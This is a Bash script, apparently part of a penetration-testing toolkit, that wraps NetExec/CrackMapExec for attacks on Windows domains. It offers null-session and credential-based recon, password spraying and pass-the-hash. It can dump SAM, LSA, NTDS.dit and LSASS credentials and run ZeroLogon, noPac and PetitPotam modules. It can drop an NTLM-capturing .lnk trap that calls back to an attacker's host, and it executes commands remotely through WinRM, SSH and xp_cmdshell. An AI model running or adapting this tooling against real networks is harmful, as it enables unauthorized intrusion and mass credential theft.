#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

# ── Detect nxc (NetExec) or crackmapexec ─────────────────────────────────────
CME=""
for _b in nxc crackmapexec cme netexec; do
  command -v "$_b" &>/dev/null && { CME="$_b"; break; }
done
if [[ -z "$CME" ]]; then
  printf '  %s[!]%s Neither nxc nor crackmapexec found.%s\n' "${RED}" "${RESET}" "${RESET}"
  printf '       pip install crackmapexec   OR\n'
  printf '       pip install netexec\n'
  exit 1
fi

banner "CRACKMAPEXEC" "SMB · LDAP · WinRM · RDP · SSH · MSSQL — full suite"

TARGET=$(prompt_target)
outdir=$(make_outdir)
outfile="$outdir/crackmap.txt"

printf '  %s[SYS]%s Engine : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$CME" "${RESET}"
printf '  %s[SYS]%s Target : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$TARGET" "${RESET}"
printf '  %s[SYS]%s Output : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

# ── Pipeline auto-mode ─────────────────────────────────────────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  # Target: alive_hosts.txt (one IP per line) > TARGET env
  _cme_target="$TARGET"
  [[ -s "${SESSION_DIR}/alive_hosts.txt" ]] && _cme_target="${SESSION_DIR}/alive_hosts.txt"

  # Auth: prefer first valid cred from chain_creds.txt, else null session
  _cu=""; _cp=""
  if [[ -s "${SESSION_DIR}/chain_creds.txt" ]]; then
    _cline=$(grep -m1 'login:.*password:' "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true)
    if [[ -n "$_cline" ]]; then
      _cu=$(echo "$_cline" | grep -oP 'login:\s*\K\S+' || true)
      _cp=$(echo "$_cline" | grep -oP 'password:\s*\K\S+' || true)
    fi
  fi

  if [[ -n "$_cu" ]]; then
    printf '  %s[CHAIN]%s Auth: %s%s%s  (chain_creds.txt)\n' \
      "${CYAN}" "${RESET}" "${GREEN}" "$_cu" "${RESET}"
    _pipe_creds=(-u "$_cu" -p "$_cp" --continue-on-success)
  else
    printf '  %s[CHAIN]%s Auth: null session\n' "${DIM}" "${RESET}"
    _pipe_creds=(-u "" -p "")
  fi

  printf '  %s[CHAIN]%s SMB full recon: %s%s%s\n\n' \
    "${CYAN}" "${RESET}" "${GREEN}" "$_cme_target" "${RESET}"

  for _task in "--shares" "--users" "--rid-brute 3000" "--pass-pol"; do
    read -ra _ta <<< "$_task"
    printf '\n── CME SMB %s ────────────────────────────\n' "${_ta[0]}" >> "$outfile"
    "$CME" smb "$_cme_target" "${_pipe_creds[@]}" "${_ta[@]}" 2>&1 | tee -a "$outfile" || true
  done

  # Users: DOMAIN\user or (username) patterns
  grep -oiE '([A-Z0-9_.-]+\\[a-zA-Z0-9._-]+)' "$outfile" 2>/dev/null \
    | awk -F'\\\\' '{print $2}' | grep -vEi '^(guest|$)' | sort -u \
    >> "${SESSION_DIR}/chain_users.txt" 2>/dev/null || true
  sort -u "${SESSION_DIR}/chain_users.txt" -o "${SESSION_DIR}/chain_users.txt" 2>/dev/null || true

  # Hashes: user:RID:LM:NT::: (SAM/NTDS dump format)
  grep -oE '[a-zA-Z0-9_$.]+:[0-9]+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}:::' "$outfile" 2>/dev/null \
    | sort -u >> "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true
  sort -u "${SESSION_DIR}/chain_hashes.txt" -o "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || true

  _uu=$(wc -l < "${SESSION_DIR}/chain_users.txt" 2>/dev/null || echo 0)
  _hh=$(wc -l < "${SESSION_DIR}/chain_hashes.txt" 2>/dev/null || echo 0)
  printf '  %s[CHAIN]%s chain_users: %s  chain_hashes: %s%s\n\n' \
    "${CYAN}" "${RESET}" "$_uu" "$_hh" "${RESET}"
  mark_done "$outfile"
  exit 0
fi

# ─────────────────────────────────────────────────────────────────────────────
# STEP 1 — Protocol
# ─────────────────────────────────────────────────────────────────────────────
section "PROTOCOL"
printf '  %s[01]%s  SMB    — shares · users · RID · SAM · NTDS · modules\n' "${CYAN}" "${RESET}"
printf '  %s[02]%s  LDAP   — ASREPRoast · Kerberoast · delegation · BloodHound\n' "${CYAN}" "${RESET}"
printf '  %s[03]%s  WinRM  — remote shell check · command exec\n' "${CYAN}" "${RESET}"
printf '  %s[04]%s  RDP    — login check · screenshot\n' "${CYAN}" "${RESET}"
printf '  %s[05]%s  SSH    — login check · command exec\n' "${CYAN}" "${RESET}"
printf '  %s[06]%s  MSSQL  — DB enum · xp_cmdshell · privilege check\n' "${CYAN}" "${RESET}"
printf '  %s[07]%s  Custom — enter full raw flags manually\n\n' "${DIM}" "${RESET}"

printf '  %s>>%s Protocol [1]: ' "${CYAN}" "${RESET}"
read -r _proto_sel; _proto_sel="${_proto_sel:-1}"

case "$_proto_sel" in
  1) PROTO="smb"   ;;
  2) PROTO="ldap"  ;;
  3) PROTO="winrm" ;;
  4) PROTO="rdp"   ;;
  5) PROTO="ssh"   ;;
  6) PROTO="mssql" ;;
  7) PROTO="custom";;
  *) PROTO="smb"   ;;
esac

if [[ "$PROTO" == "custom" ]]; then
  printf '  %s>>%s Full flags (after "%s "): ' "${CYAN}" "${RESET}" "$CME"
  read -ra _raw_flags
  printf '\n'
  printf '── CUSTOM ──────────────────────────────────────\n' >> "$outfile"
  run_fg "$CME" "${_raw_flags[@]}" | (trap '' SIGINT; tee -a "$outfile")
  mark_done "$outfile"
  exit 0
fi

printf '  %s[*]%s Protocol : %s%s%s\n\n' "${GREEN}" "${RESET}" "${BOLD}" "$PROTO" "${RESET}"

# ─────────────────────────────────────────────────────────────────────────────
# STEP 2 — Authentication
# ─────────────────────────────────────────────────────────────────────────────
section "AUTHENTICATION"
printf '  %s[01]%s  Null / anonymous       %s(empty user + pass — default)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[02]%s  Custom user + password\n' "${CYAN}" "${RESET}"
printf '  %s[03]%s  Pass-the-Hash          %s(NTLM hash, no cleartext needed)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[04]%s  File-based spray       %s(users file + passwords file)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[05]%s  Guest account          %s(user=guest, pass=empty)%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"

printf '  %s>>%s Auth mode [1]: ' "${CYAN}" "${RESET}"
read -r _auth_sel; _auth_sel="${_auth_sel:-1}"

declare -a AUTH_ARGS=()

_ask_domain_local() {
  printf '  %s>>%s Domain (blank = local/workgroup): ' "${CYAN}" "${RESET}"
  read -r _dom
  [[ -n "$_dom" ]] && AUTH_ARGS+=(-d "$_dom")
  printf '  %s>>%s Force local auth (--local-auth)? [y/N]: ' "${CYAN}" "${RESET}"
  read -r _loc
  [[ "$_loc" =~ ^[Yy] ]] && AUTH_ARGS+=(--local-auth)
}

case "$_auth_sel" in
  1)
    AUTH_ARGS=(-u "" -p "")
    printf '  %s[*]%s Null session%s\n' "${GREEN}" "${RESET}" "${RESET}"
    ;;
  2)
    printf '  %s>>%s Username: ' "${CYAN}" "${RESET}"; read -r _user
    printf '  %s>>%s Password: ' "${CYAN}" "${RESET}"; read -r _pass
    AUTH_ARGS=(-u "$_user" -p "$_pass")
    _ask_domain_local
    printf '  %s>>%s Continue on success (spray)? [y/N]: ' "${CYAN}" "${RESET}"
    read -r _cos; [[ "$_cos" =~ ^[Yy] ]] && AUTH_ARGS+=(--continue-on-success)
    printf '  %s[*]%s Creds: %s / %s%s\n' "${GREEN}" "${RESET}" "$_user" "$_pass" "${RESET}"
    ;;
  3)
    printf '  %s>>%s Username: ' "${CYAN}" "${RESET}"; read -r _user
    printf '  %s>>%s NTLM Hash (LM:NT or NT only): ' "${CYAN}" "${RESET}"; read -r _hash
    AUTH_ARGS=(-u "$_user" -H "$_hash")
    _ask_domain_local
    printf '  %s[*]%s PTH: %s → %s%s\n' "${GREEN}" "${RESET}" "$_user" "$_hash" "${RESET}"
    ;;
  4)
    printf '  %s>>%s Users file: ' "${CYAN}" "${RESET}"; read -r _ufile
    printf '  %s>>%s Passwords file: ' "${CYAN}" "${RESET}"; read -r _pfile
    AUTH_ARGS=(-u "$_ufile" -p "$_pfile")
    _ask_domain_local
    printf '  %s>>%s Pair user:pass 1-to-1 (--no-bruteforce)? [y/N]: ' "${CYAN}" "${RESET}"
    read -r _nbf; [[ "$_nbf" =~ ^[Yy] ]] && AUTH_ARGS+=(--no-bruteforce)
    printf '  %s>>%s Continue on success? [y/N]: ' "${CYAN}" "${RESET}"
    read -r _cos; [[ "$_cos" =~ ^[Yy] ]] && AUTH_ARGS+=(--continue-on-success)
    ;;
  5)
    AUTH_ARGS=(-u "guest" -p "")
    printf '  %s[*]%s Guest account%s\n' "${GREEN}" "${RESET}" "${RESET}"
    ;;
  *)
    AUTH_ARGS=(-u "" -p "")
    ;;
esac

# ─────────────────────────────────────────────────────────────────────────────
# Helper: build + run one CME command, append to outfile
# ─────────────────────────────────────────────────────────────────────────────
_run_cme() {
  local _label="$1"; shift
  local _cmd=("$CME" "$PROTO" "$TARGET" "${AUTH_ARGS[@]}" "$@")
  printf '\n  %s[CMD]%s %s\n\n' "${DIM}" "${RESET}" "${_cmd[*]}"
  printf '\n── %s ──────────────────────────────────────\n' "$_label" >> "$outfile"
  run_fg "${_cmd[@]}" | (trap '' SIGINT; tee -a "$outfile")
  printf '\n'
}

# ─────────────────────────────────────────────────────────────────────────────
# STEP 3 — Action
# ─────────────────────────────────────────────────────────────────────────────
section "ACTION"

# ── SMB ───────────────────────────────────────────────────────────────────────
if [[ "$PROTO" == "smb" ]]; then
  printf '  ── Enumeration ────────────────────────────────────────────────\n'
  printf '  %s[01]%s  Shares               — list accessible SMB shares\n' "${CYAN}" "${RESET}"
  printf '  %s[02]%s  Users                — enumerate domain users\n' "${CYAN}" "${RESET}"
  printf '  %s[03]%s  RID Brute            — enumerate users via RID cycling\n' "${CYAN}" "${RESET}"
  printf '  %s[04]%s  Groups               — enumerate domain groups\n' "${CYAN}" "${RESET}"
  printf '  %s[05]%s  Password Policy      — lockout threshold + complexity\n' "${CYAN}" "${RESET}"
  printf '  %s[06]%s  Logged-on + Sessions — active sessions on host\n' "${CYAN}" "${RESET}"
  printf '  %s[07]%s  Disks                — enumerate local disks\n' "${CYAN}" "${RESET}"
  printf '  ── Credential Dump (admin required) ───────────────────────────\n'
  printf '  %s[08]%s  SAM Dump             — local account hashes\n' "${RED}" "${RESET}"
  printf '  %s[09]%s  LSA Secrets          — cached domain credentials\n' "${RED}" "${RESET}"
  printf '  %s[10]%s  NTDS.dit             — full domain hash dump (DC only)\n' "${RED}" "${RESET}"
  printf '  %s[11]%s  Lsassy              — LSASS credential dump\n' "${RED}" "${RESET}"
  printf '  ── CVE / Vulnerability Checks ─────────────────────────────────\n'
  printf '  %s[12]%s  ZeroLogon            — CVE-2020-1472 check\n' "${YELLOW}" "${RESET}"
  printf '  %s[13]%s  noPac                — CVE-2021-42278/42287 check\n' "${YELLOW}" "${RESET}"
  printf '  %s[14]%s  PetitPotam           — CVE-2021-36942 NTLM coerce\n' "${YELLOW}" "${RESET}"
  printf '  ── Recon Modules ──────────────────────────────────────────────\n'
  printf '  %s[15]%s  Spider+              — crawl all shares for sensitive files\n' "${CYAN}" "${RESET}"
  printf '  %s[16]%s  Slinky               — drop .lnk NTLM capture trap in shares\n' "${CYAN}" "${RESET}"
  printf '  ── Presets ────────────────────────────────────────────────────\n'
  printf '  %s[17]%s  Full Recon           — shares + users + RID + pass-pol\n' "${GREEN}" "${RESET}"
  printf '  %s[18]%s  Custom flags         — enter manually\n\n' "${DIM}" "${RESET}"

  printf '  %s>>%s Action [1]: ' "${CYAN}" "${RESET}"
  read -r _act; _act="${_act:-1}"

  case "$_act" in
    1)  _run_cme "SHARES"          --shares ;;
    2)  _run_cme "USERS"           --users ;;
    3)
        printf '  %s>>%s Max RID to cycle [4000]: ' "${CYAN}" "${RESET}"
        read -r _rid; _rid="${_rid:-4000}"
        _run_cme "RID BRUTE (max $_rid)" --rid-brute "$_rid"
        ;;
    4)  _run_cme "GROUPS"          --groups ;;
    5)  _run_cme "PASSWORD POLICY" --pass-pol ;;
    6)  _run_cme "SESSIONS"        --sessions --loggedon-users ;;
    7)  _run_cme "DISKS"           --disks ;;
    8)  _run_cme "SAM DUMP"        --sam ;;
    9)  _run_cme "LSA SECRETS"     --lsa ;;
    10)
        printf '  %s>>%s Method — drsuapi / vss [drsuapi]: ' "${CYAN}" "${RESET}"
        read -r _ntds_m; _ntds_m="${_ntds_m:-drsuapi}"
        _run_cme "NTDS DUMP"       --ntds "$_ntds_m"
        ;;
    11) _run_cme "LSASSY"          -M lsassy ;;
    12) _run_cme "ZEROLOGON"       -M zerologon ;;
    13) _run_cme "NOPAC"           -M nopac ;;
    14) _run_cme "PETITPOTAM"      -M petitpotam ;;
    15) _run_cme "SPIDER+"         -M spider_plus ;;
    16)
        printf '  %s>>%s LHOST (your IP for the .lnk listener): ' "${CYAN}" "${RESET}"
        read -r _lh
        printf '  %s>>%s Share name to drop in: ' "${CYAN}" "${RESET}"
        read -r _sh
        _run_cme "SLINKY"          -M slinky -o "SERVER=$_lh" -o "NAME=$_sh"
        ;;
    17)
        _run_cme "SHARES"          --shares
        _run_cme "USERS"           --users
        _run_cme "RID BRUTE"       --rid-brute 4000
        _run_cme "PASSWORD POLICY" --pass-pol
        _run_cme "SESSIONS"        --sessions --loggedon-users
        ;;
    18)
        printf '  %s>>%s Custom flags: ' "${CYAN}" "${RESET}"
        read -ra _cf
        _run_cme "CUSTOM"          "${_cf[@]}"
        ;;
    *)  _run_cme "SHARES"          --shares ;;
  esac

# ── LDAP ──────────────────────────────────────────────────────────────────────
elif [[ "$PROTO" == "ldap" ]]; then
  printf '  %s[01]%s  Users                — enumerate domain users\n' "${CYAN}" "${RESET}"
  printf '  %s[02]%s  Groups               — enumerate domain groups\n' "${CYAN}" "${RESET}"
  printf '  %s[03]%s  ASREPRoast           — find accounts without Kerberos pre-auth\n' "${YELLOW}" "${RESET}"
  printf '  %s[04]%s  Kerberoast           — enumerate SPNs for offline cracking\n' "${YELLOW}" "${RESET}"
  printf '  %s[05]%s  Find Delegation      — unconstrained + constrained delegation\n' "${YELLOW}" "${RESET}"
  printf '  %s[06]%s  Password Not Req.    — accounts with PASSWD_NOTREQD flag\n' "${CYAN}" "${RESET}"
  printf '  %s[07]%s  Admin Count          — accounts with adminCount=1\n' "${CYAN}" "${RESET}"
  printf '  %s[08]%s  Trusted for Deleg.   — computers trusted for delegation\n' "${CYAN}" "${RESET}"
  printf '  %s[09]%s  BloodHound Collect   — ingest for BloodHound\n' "${RED}" "${RESET}"
  printf '  %s[10]%s  Full Recon           — users + groups + ASREPRoast + Kerberoast\n' "${GREEN}" "${RESET}"
  printf '  %s[11]%s  Custom flags\n\n' "${DIM}" "${RESET}"

  printf '  %s>>%s Action [1]: ' "${CYAN}" "${RESET}"
  read -r _act; _act="${_act:-1}"

  case "$_act" in
    1)  _run_cme "USERS"             --users ;;
    2)  _run_cme "GROUPS"            --groups ;;
    3)  _run_cme "ASREPROAST"        --asreproast "$outdir/asrep_hashes.txt"
        [[ -f "$outdir/asrep_hashes.txt" ]] && \
          printf '  %s[+]%s Hashes saved → %s\n' "${GREEN}" "${RESET}" "$outdir/asrep_hashes.txt"
        ;;
    4)  _run_cme "KERBEROAST"        --kerberoasting "$outdir/kerb_hashes.txt"
        [[ -f "$outdir/kerb_hashes.txt" ]] && \
          printf '  %s[+]%s Hashes saved → %s\n' "${GREEN}" "${RESET}" "$outdir/kerb_hashes.txt"
        ;;
    5)  _run_cme "FIND DELEGATION"   --find-delegation ;;
    6)  _run_cme "PASSWD_NOTREQD"    --password-not-required ;;
    7)  _run_cme "ADMIN COUNT"       --admin-count ;;
    8)  _run_cme "TRUSTED-FOR-DELEG" --trusted-for-delegation ;;
    9)  _run_cme "BLOODHOUND"        -M bloodhound ;;
    10)
        _run_cme "USERS"             --users
        _run_cme "GROUPS"            --groups
        _run_cme "ASREPROAST"        --asreproast "$outdir/asrep_hashes.txt"
        _run_cme "KERBEROAST"        --kerberoasting "$outdir/kerb_hashes.txt"
        _run_cme "FIND DELEGATION"   --find-delegation
        _run_cme "PASSWD_NOTREQD"    --password-not-required
        ;;
    11) printf '  %s>>%s Custom flags: ' "${CYAN}" "${RESET}"
        read -ra _cf; _run_cme "CUSTOM" "${_cf[@]}" ;;
    *)  _run_cme "USERS"             --users ;;
  esac

# ── WinRM ─────────────────────────────────────────────────────────────────────
elif [[ "$PROTO" == "winrm" ]]; then
  printf '  %s[01]%s  Login check          — verify creds / show pwned\n' "${CYAN}" "${RESET}"
  printf '  %s[02]%s  Execute command      — run OS command via WinRM\n' "${CYAN}" "${RESET}"
  printf '  %s[03]%s  Execute PowerShell   — run PS script\n' "${CYAN}" "${RESET}"
  printf '  %s[04]%s  Custom flags\n\n' "${DIM}" "${RESET}"

  printf '  %s>>%s Action [1]: ' "${CYAN}" "${RESET}"
  read -r _act; _act="${_act:-1}"

  case "$_act" in
    1)  _run_cme "WINRM LOGIN" ;;
    2)  printf '  %s>>%s Command: ' "${CYAN}" "${RESET}"; read -r _cmd
        _run_cme "EXEC" -x "$_cmd" ;;
    3)  printf '  %s>>%s PowerShell: ' "${CYAN}" "${RESET}"; read -r _ps
        _run_cme "PS EXEC" -X "$_ps" ;;
    4)  printf '  %s>>%s Custom flags: ' "${CYAN}" "${RESET}"
        read -ra _cf; _run_cme "CUSTOM" "${_cf[@]}" ;;
    *)  _run_cme "WINRM LOGIN" ;;
  esac

# ── RDP ───────────────────────────────────────────────────────────────────────
elif [[ "$PROTO" == "rdp" ]]; then
  printf '  %s[01]%s  Login check          — verify creds\n' "${CYAN}" "${RESET}"
  printf '  %s[02]%s  Screenshot           — capture screen %s(NLA must be off)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[03]%s  NLA check            — detect Network Level Auth status\n' "${CYAN}" "${RESET}"
  printf '  %s[04]%s  Custom flags\n\n' "${DIM}" "${RESET}"

  printf '  %s>>%s Action [1]: ' "${CYAN}" "${RESET}"
  read -r _act; _act="${_act:-1}"

  case "$_act" in
    1)  _run_cme "RDP LOGIN" ;;
    2)  _run_cme "SCREENSHOT" --screenshot ;;
    3)  _run_cme "NLA CHECK"  --nla-screenshot ;;
    4)  printf '  %s>>%s Custom flags: ' "${CYAN}" "${RESET}"
        read -ra _cf; _run_cme "CUSTOM" "${_cf[@]}" ;;
    *)  _run_cme "RDP LOGIN" ;;
  esac

# ── SSH ───────────────────────────────────────────────────────────────────────
elif [[ "$PROTO" == "ssh" ]]; then
  printf '  %s[01]%s  Login check\n' "${CYAN}" "${RESET}"
  printf '  %s[02]%s  Execute command\n' "${CYAN}" "${RESET}"
  printf '  %s[03]%s  Custom flags\n\n' "${DIM}" "${RESET}"

  printf '  %s>>%s Action [1]: ' "${CYAN}" "${RESET}"
  read -r _act; _act="${_act:-1}"

  case "$_act" in
    1)  _run_cme "SSH LOGIN" ;;
    2)  printf '  %s>>%s Command: ' "${CYAN}" "${RESET}"; read -r _cmd
        _run_cme "EXEC" -x "$_cmd" ;;
    3)  printf '  %s>>%s Custom flags: ' "${CYAN}" "${RESET}"
        read -ra _cf; _run_cme "CUSTOM" "${_cf[@]}" ;;
    *)  _run_cme "SSH LOGIN" ;;
  esac

# ── MSSQL ─────────────────────────────────────────────────────────────────────
elif [[ "$PROTO" == "mssql" ]]; then
  printf '  %s[01]%s  Login check + DB info\n' "${CYAN}" "${RESET}"
  printf '  %s[02]%s  xp_cmdshell          — OS command execution (sysadmin req.)\n' "${RED}" "${RESET}"
  printf '  %s[03]%s  PowerShell exec      — PS via xp_cmdshell\n' "${RED}" "${RESET}"
  printf '  %s[04]%s  Privilege check      — check sysadmin + impersonation\n' "${CYAN}" "${RESET}"
  printf '  %s[05]%s  Custom flags\n\n' "${DIM}" "${RESET}"

  printf '  %s>>%s Action [1]: ' "${CYAN}" "${RESET}"
  read -r _act; _act="${_act:-1}"

  case "$_act" in
    1)  _run_cme "MSSQL INFO" ;;
    2)  printf '  %s>>%s OS Command: ' "${CYAN}" "${RESET}"; read -r _cmd
        _run_cme "XPCMD" -x "$_cmd" ;;
    3)  printf '  %s>>%s PowerShell: ' "${CYAN}" "${RESET}"; read -r _ps
        _run_cme "PS EXEC" -X "$_ps" ;;
    4)  _run_cme "PRIV CHECK" -M mssql_priv ;;
    5)  printf '  %s>>%s Custom flags: ' "${CYAN}" "${RESET}"
        read -ra _cf; _run_cme "CUSTOM" "${_cf[@]}" ;;
    *)  _run_cme "MSSQL INFO" ;;
  esac
fi

mark_done "$outfile"
